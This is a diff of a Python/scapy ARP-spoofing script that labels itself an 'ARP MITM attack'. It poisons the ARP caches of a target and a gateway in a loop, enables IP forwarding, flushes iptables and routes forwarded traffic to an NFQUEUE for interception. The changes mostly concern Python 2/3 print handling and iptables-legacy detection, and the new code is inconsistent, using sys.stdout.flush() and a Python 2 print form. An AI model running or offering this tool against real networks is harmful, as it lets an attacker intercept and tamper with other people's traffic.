@@ -1,4 +1,4 @@
-#!/usr/bin/env python3
+#!/usr/bin/env python
 
 import time
 import scapy.all as scapy
@@ -7,7 +7,7 @@ import os
 import argparse
 
 
-def get_Args():
+def get_args():
     parser = argparse.ArgumentParser(prog="Arp-spoofer",
                                      usage="-t target | -s spoof_ip",
                                      description="ARP MITM attack",
@@ -34,7 +34,7 @@ def get_mac(ip):
     arp_req_broadcast = broadcast/arp_req
     # print(arp_req_broadcast.summary())
     answer_list = scapy.srp(arp_req_broadcast, timeout=1, verbose=0)[0]
-
+    # print(answer_list[0])
     return answer_list[0][1].hwsrc
 
 
@@ -54,47 +54,55 @@ def spoof(target_ip, gw_ip):
 
 def fw_on():
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
-    os.system("iptables -F")
-    os.system("iptables -F -t nat")
-    os.system("iptables -P FORWARD ACCEPT")
-    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
-    os.system("iptables-legacy -F")
-    os.system("iptables-legacy -F -t nat")
-    os.system("iptables-legacy -P FORWARD ACCEPT")
-    os.system("iptables-legacy -I FORWARD -j NFQUEUE --queue-num 1")
+    if os.path.isfile('/usr/sbin/iptables-legacy'):
+        os.system("iptables -F")
+        os.system("iptables -F -t nat")
+        os.system("iptables -P FORWARD ACCEPT")
+        os.system("iptables-legacy -F")
+        os.system("iptables-legacy -F -t nat")
+        os.system("iptables-legacy -P FORWARD ACCEPT")
+        os.system("iptables-legacy -I FORWARD -j NFQUEUE --queue-num 1")
+    else:
+        os.system("iptables -F")
+        os.system("iptables -F -t nat")
+        os.system("iptables -P FORWARD ACCEPT")
+        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 1")
     return
 
 
 def fw_off():
 
     os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
-    os.system("iptables-restore < /root/iptables")
-    os.system("iptables-legacy-restore < /root/iptables-legacy")
+
+    if os.path.isfile('/usr/sbin/iptables-legacy'):
+        os.system("iptables-legacy-restore < /root/iptables-legacy")
+        os.system("iptables-restore < /root/iptables")
+    else:
+        os.system("iptables-restore < /root/iptables")
     return
 
 
 packet_Count = 0
 
-options = get_Args()
+options = get_args()
+print("[+] Setting up iptables rules ... done")
+fw_on()
+# time.sleep(2)
 
 try:
-
-    print("[+] Setting up iptables rules ... done")
-    fw_on()
-
     while True:
-
         spoof(options.target_ip, options.spoof_ip)
         spoof(options.spoof_ip, options.target_ip)
         packet_Count += 2
-        print("\r[+] Packets sent: " + str(packet_Count), end='\n',
-              flush=False)
-# sys.stdout.flush() python2 only ...
+        print("\r[+] Packets sent: " + str(packet_Count)), # + , end='')
+# , end='')python3 only ...
+        sys.stdout.flush()
         time.sleep(2)
 
 except KeyboardInterrupt:
     print("\n[*] Restoring iptables rules ... please wait ... Done !")
     fw_off()
+    print("\n[*] Restoring tables.. please wait ...")
     restore_tables(options.target_ip, options.spoof_ip)
     restore_tables(options.spoof_ip, options.target_ip)
-    print("\n[*] Restoring tables.. please wait ... Done !")
+    time.sleep(2)
